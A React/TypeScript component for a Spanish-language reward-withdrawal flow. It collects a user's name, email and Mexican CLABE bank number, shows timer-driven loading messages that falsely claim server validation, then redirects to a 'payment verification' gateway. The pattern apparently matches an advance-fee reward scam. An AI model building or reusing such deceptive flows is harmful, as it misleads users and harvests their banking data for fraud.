import { useEffect, useRef, useState, type InputHTMLAttributes, type ReactNode } from "react";
import { LoadingLogoSlot } from "../components/LoadingLogoSlot";
import { Logo } from "../components/Logo";
import { useAppState } from "../context/AppStateContext";
import { api } from "../lib/api";
import { digitsOnly, formatClabe, isValidClabe, validateClabe } from "../lib/clabe";
import { transitionTo } from "../lib/router";
import { validateEmail, validateNome } from "../lib/rewardProfile";

const SHAKE_MS = 450;
const LOADING_TEXTS = [
  "Validando datos...",
  "Conectando con el servidor...",
  "Finalizando canje...",
  "Casi listo...",
] as const;
const LOADING_PROGRESS = [25, 55, 80, 100] as const;
const LOADING_STEP_MS = 1600;
const LOADING_FADE_MS = 150;
const LOADING_END_MS = 700;

type InnerStep = 1 | 2 | 3 | 4;
type FieldName = "nome" | "email" | "clabe";

function Field({
  label,
  error,
  hint,
  shaking,
  className,
  children,
}: {
  label: string;
  error?: string;
  hint?: string;
  shaking?: boolean;
  className?: string;
  children: ReactNode;
}) {
  return (
    <label className={`field${error ? " is-invalid" : ""}${shaking ? " is-shaking" : ""}${className ? ` ${className}` : ""}`}>
      <span className="field-label">{label}</span>
      {children}
      {error ? <p className="field-error">{error}</p> : hint ? <p className="field-hint">{hint}</p> : null}
    </label>
  );
}

function TextInput(props: InputHTMLAttributes<HTMLInputElement>) {
  return <input {...props} />;
}

function ClabeTick() {
  return (
    <span className="clabe-valid-tick" aria-hidden="true">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="11" fill="#14b8a6" />
        <path d="M7.2 12.4l3.1 3.1 6.5-6.6" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
      </svg>
    </span>
  );
}

function nomeError(raw: string): string | null {
  if (!raw.trim()) return "Escribe tu nombre completo.";
  return validateNome(raw);
}

export function Setup() {
  const { patchUserData, userData } = useAppState();
  const [inner, setInner] = useState<InnerStep>(1);
  const [busy, setBusy] = useState(false);
  const [nome, setNome] = useState(userData.nome);
  const [email, setEmail] = useState(userData.email);
  const [clabe, setClabe] = useState(() => formatClabe(userData.clabe || userData.chave));
  const [errors, setErrors] = useState<Partial<Record<FieldName, string>>>({});
  const [shaking, setShaking] = useState<Partial<Record<FieldName, boolean>>>({});
  const [loadText, setLoadText] = useState<string>(LOADING_TEXTS[0]);
  const [loadOpacity, setLoadOpacity] = useState(1);
  const shakeTimer = useRef(0);
  const busyLock = useRef(false);
  const loadBarRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    return () => window.clearTimeout(shakeTimer.current);
  }, []);

  useEffect(() => {
    if (inner !== 3) return;

    const bar = loadBarRef.current;
    const timeouts: number[] = [];
    let index = 0;

    setLoadText(LOADING_TEXTS[0]);
    setLoadOpacity(1);

    if (bar) {
      bar.style.transition = "none";
      bar.style.width = "0%";
      void bar.offsetWidth;
      bar.style.transition = "width 1.3s ease-in-out";
    }

    timeouts.push(
      window.setTimeout(() => {
        if (bar) bar.style.width = `${LOADING_PROGRESS[0]}%`;
      }, 40),
    );

    const interval = window.setInterval(() => {
      if (index >= LOADING_TEXTS.length - 1) {
        window.clearInterval(interval);
        timeouts.push(window.setTimeout(() => setInner(4), LOADING_END_MS));
        return;
      }
      setLoadOpacity(0);
      timeouts.push(
        window.setTimeout(() => {
          index += 1;
          setLoadText(LOADING_TEXTS[index]);
          setLoadOpacity(1);
          if (bar) bar.style.width = `${LOADING_PROGRESS[index]}%`;
        }, LOADING_FADE_MS),
      );
    }, LOADING_STEP_MS);

    return () => {
      window.clearInterval(interval);
      timeouts.forEach((id) => window.clearTimeout(id));
    };
  }, [inner]);

  function shake(keys: FieldName[]) {
    window.clearTimeout(shakeTimer.current);
    setShaking({});
    window.requestAnimationFrame(() => {
      setShaking(Object.fromEntries(keys.map((key) => [key, true])));
    });
    shakeTimer.current = window.setTimeout(() => setShaking({}), SHAKE_MS);
  }

  function clearError(field: FieldName) {
    setErrors((prev) => {
      if (!prev[field]) return prev;
      const next = { ...prev };
      delete next[field];
      return next;
    });
  }

  function persistDraft(nextNome = nome, nextEmail = email, nextClabe = clabe) {
    const digits = digitsOnly(nextClabe);
    patchUserData({
      nome: nextNome.trim().replace(/\s+/g, " "),
      email: nextEmail.trim(),
      clabe: digits,
      metodo: "SPEI",
    });
  }

  function goCheckout() {
    transitionTo("checkout");
  }

  function submitProfile() {
    if (busyLock.current) return;
    const next: Partial<Record<FieldName, string>> = {};
    const nErr = nomeError(nome);
    const eErr = validateEmail(email);
    const cErr = validateClabe(clabe);
    if (nErr) next.nome = nErr;
    if (eErr) next.email = eErr;
    if (cErr) next.clabe = cErr;
    if (next.nome || next.email || next.clabe) {
      setErrors(next);
      shake(Object.keys(next) as FieldName[]);
      return;
    }
    busyLock.current = true;
    setBusy(true);
    persistDraft();
    setInner(2);
    busyLock.current = false;
    setBusy(false);
  }

  function submitReceive() {
    if (busyLock.current) return;
    const err = validateClabe(clabe);
    if (err) {
      setErrors({ clabe: err });
      shake(["clabe"]);
      return;
    }
    const payloadNome = nome.trim().replace(/\s+/g, " ");
    const payloadEmail = email.trim();
    persistDraft(payloadNome, payloadEmail, clabe);
    setNome(payloadNome);
    setEmail(payloadEmail);
    setClabe(formatClabe(clabe));
    setInner(3);
  }

  async function confirmReview() {
    if (busyLock.current) return;
    busyLock.current = true;
    setBusy(true);
    try {
      await api.updateProfile({
        beneficiaryName: nome.trim().replace(/\s+/g, " "),
        clabe: digitsOnly(clabe),
      });
    } catch {
      /* AppState already has the draft */
    }
    transitionTo("payment-gateway");
  }

  function backToMethod() {
    busyLock.current = false;
    setBusy(false);
    setInner(2);
  }

  const panelClass =
    "setup-step withdraw-flow-panel" + (inner === 3 ? " is-loading" : "") + (inner === 4 ? " is-review" : "");
  const panelId = inner === 1 ? "five-step1" : inner === 2 ? "five-step2" : inner === 3 ? "five-step3" : "five-step4";
  const clabeDigits = digitsOnly(clabe);
  const clabeOk = isValidClabe(clabe) && !errors.clabe;

  return (
    <div className={panelClass} id={panelId}>
      {inner === 1 ? (
        <>
          <button type="button" className="btn-voltar-metodo" aria-label="Volver" onClick={goCheckout}>
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="15 18 9 12 15 6" />
            </svg>
            <span>Volver</span>
          </button>
          <div className="title saque-title">Verifica tus datos</div>
          <div className="bloco">
            <Field label="Nombre completo" error={errors.nome} shaking={shaking.nome}>
              <TextInput
                id="nome"
                type="text"
                placeholder="Maria Guadalupe"
                autoComplete="off"
                value={nome}
                onChange={(e) => {
                  setNome(e.target.value);
                  clearError("nome");
                }}
              />
            </Field>
            <Field label="E-mail" error={errors.email} shaking={shaking.email}>
              <TextInput
                id="email"
                type="email"
                placeholder="maria.guadalupe@exemple.com"
                autoComplete="off"
                inputMode="email"
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value);
                  clearError("email");
                }}
              />
            </Field>
            <Field
              label="CLABE"
              error={errors.clabe}
              hint={errors.clabe ? undefined : "18 dígitos · Transferencia SPEI"}
              shaking={shaking.clabe}
            >
              <span className={`field-input-wrap${clabeOk ? " is-valid" : ""}`}>
                <TextInput
                  id="clabe-input"
                  type="tel"
                  placeholder="014 027 0000 0555 5558"
                  inputMode="numeric"
                  autoComplete="off"
                  maxLength={22}
                  value={clabe}
                  onChange={(e) => {
                    setClabe(formatClabe(e.target.value));
                    clearError("clabe");
                  }}
                />
                {clabeOk ? <ClabeTick /> : null}
              </span>
            </Field>
            <button type="button" id="btn-five-step1" className="btn btn-block btn-square" disabled={busy} onClick={submitProfile}>
              Continuar
            </button>
          </div>
        </>
      ) : null}

      {inner === 2 ? (
        <>
          <button type="button" className="btn-voltar-metodo" aria-label="Volver" onClick={() => setInner(1)}>
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="15 18 9 12 15 6" />
            </svg>
            <span>Volver</span>
          </button>
          <div className="title saque-title">Método de retiro</div>
          <div className="bloco">
            <p className="pg-method-note">Transferencia SPEI</p>
            <Field
              label="CLABE"
              error={errors.clabe}
              shaking={shaking.clabe}
            >
              <span className={`field-input-wrap${clabeOk ? " is-valid" : ""}`}>
                <TextInput
                  id="pix-key-input"
                  type="tel"
                  placeholder="000 000 0000 0000 0000"
                  inputMode="numeric"
                  autoComplete="off"
                  maxLength={22}
                  value={clabe}
                  onChange={(e) => {
                    setClabe(formatClabe(e.target.value));
                    clearError("clabe");
                  }}
                />
                {clabeOk ? <ClabeTick /> : null}
              </span>
            </Field>
            <button
              type="button"
              id="btn-enviar-pix"
              className="btn btn-block btn-square"
              disabled={busy}
              aria-busy={busy}
              aria-label="retirar dinero"
              onClick={submitReceive}
            >
              Confirmar
            </button>
            <p className="clabe-confirm-note">
              Asegúrate de que la CLABE para retirar ingresada sea correcta antes de confirmar.
            </p>
          </div>
        </>
      ) : null}

      {inner === 3 ? (
        <>
          <LoadingLogoSlot />
          <main className="loading-main-content">
            <div className="new-loading-container">
              <div className="new-loading-text" id="new-loading-text" style={{ opacity: loadOpacity }} role="status" aria-live="polite">
                {loadText}
              </div>
              <div className="new-progress-track">
                <div className="new-progress-bar" id="new-progress-bar" ref={loadBarRef} />
              </div>
            </div>
          </main>
        </>
      ) : null}

      {inner === 4 ? (
        <div className="retiro-review">
          <div className="retiro-review-logo">
            <Logo word={false} />
          </div>
          <h2 className="retiro-review-title">Confirmar retiro</h2>
          <p className="retiro-review-sub">Revisa los datos antes de continuar.</p>
          <dl className="retiro-review-rows">
            <div className="retiro-review-row">
              <dt>Nombre</dt>
              <dd>{nome}</dd>
            </div>
            <div className="retiro-review-row">
              <dt>Email</dt>
              <dd>{email}</dd>
            </div>
            <div className="retiro-review-row">
              <dt>CLABE</dt>
              <dd>{formatClabe(clabe)}</dd>
            </div>
            <div className="retiro-review-row">
              <dt>Transferencia SPEI</dt>
              <dd>{clabeDigits ? `****${clabeDigits.slice(-4)}` : "SPEI"}</dd>
            </div>
          </dl>
          <button
            type="button"
            id="btn-retiro-continuar"
            className="btn btn-block retiro-review-continue"
            disabled={busy}
            aria-busy={busy}
            onClick={() => void confirmReview()}
          >
            Continuar
          </button>
          <button type="button" className="btn btn-block retiro-review-back" onClick={backToMethod}>
            Volver y corregir
          </button>
          <p className="retiro-review-foot">Al continuar, serás redirigido al proceso de verificación de pago.</p>
        </div>
      ) : null}
    </div>
  );
}
